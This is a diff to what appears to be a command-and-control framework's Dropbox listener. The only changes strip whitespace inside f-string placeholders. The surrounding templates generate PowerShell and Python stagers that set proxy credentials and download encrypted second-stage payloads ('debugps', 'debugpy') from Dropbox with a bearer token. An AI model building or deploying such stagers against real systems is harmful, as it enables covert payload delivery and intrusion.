@@ -210,7 +210,7 @@ class Listener:
             if user_agent.lower() == "default":
                 profile = listenerOptions["DefaultProfile"]["Value"]
                 user_agent = profile.split("|")[1]
-            stager += f"$u='{ user_agent }';"
+            stager += f"$u='{user_agent}';"
 
             if user_agent.lower() != "none" or proxy.lower() != "none":
                 if user_agent.lower() != "none":
@@ -224,7 +224,7 @@ class Listener:
                         # TODO: implement form for other proxy
                         stager += f"""
                             $proxy=New-Object Net.WebProxy;
-                            $proxy.Address = '{ proxy.lower() }';
+                            $proxy.Address = '{proxy.lower()}';
                             $wc.Proxy = $proxy;
                         """
 
@@ -238,7 +238,7 @@ class Listener:
                         domain = username.split("\\")[0]
                         usr = username.split("\\")[1]
                         stager += f"""
-                            $netcred = New-Object System.Net.NetworkCredential('{ usr }', '{ password }', '{ domain }');
+                            $netcred = New-Object System.Net.NetworkCredential('{usr}', '{password}', '{domain}');
                             $wc.Proxy.Credentials = $netcred;
                         """
 
@@ -256,9 +256,9 @@ class Listener:
             stager += dedent(
                 f"""
                 # add in the Dropbox auth token and API params
-                $t='{ api_token }';
+                $t='{api_token}';
                 $wc.Headers.Add("Authorization","Bearer $t");
-                $wc.Headers.Add("Dropbox-API-Arg",\'{{"path":"{ staging_folder }/debugps"}}\');
+                $wc.Headers.Add("Dropbox-API-Arg",\'{{"path":"{staging_folder}/debugps"}}\');
                 $data=$wc.DownloadData('https://content.dropboxapi.com/2/files/download');
                 $iv=$data[0..3];$data=$data[4..$data.length];
 
@@ -304,13 +304,13 @@ class Listener:
             launcherBase += dedent(
                 f"""
                 import urllib.request;
-                UA='{ user_agent }';
-                t='{ api_token }';
+                UA='{user_agent}';
+                t='{api_token}';
                 server='https://content.dropboxapi.com/2/files/download';
                 req=urllib.request.Request(server);
                 req.add_header('User-Agent',UA);
                 req.add_header("Authorization","Bearer "+t);
-                req.add_header("Dropbox-API-Arg",'{{"path":"{ staging_folder }/debugpy"}}');
+                req.add_header("Dropbox-API-Arg",'{{"path":"{staging_folder}/debugpy"}}');
                 """
             )
 
@@ -330,7 +330,7 @@ class Listener:
                         password = proxy_creds.split(":")[1]
                         launcherBase += dedent(
                             f"""
-                            proxy_auth_handler.add_password(None,'{ proxy }', '{ username }', '{ password }');
+                            proxy_auth_handler.add_password(None,'{proxy}', '{username}', '{password}');
                             o = urllib.request.build_opener(proxy, proxy_auth_handler);
                         """
                         )
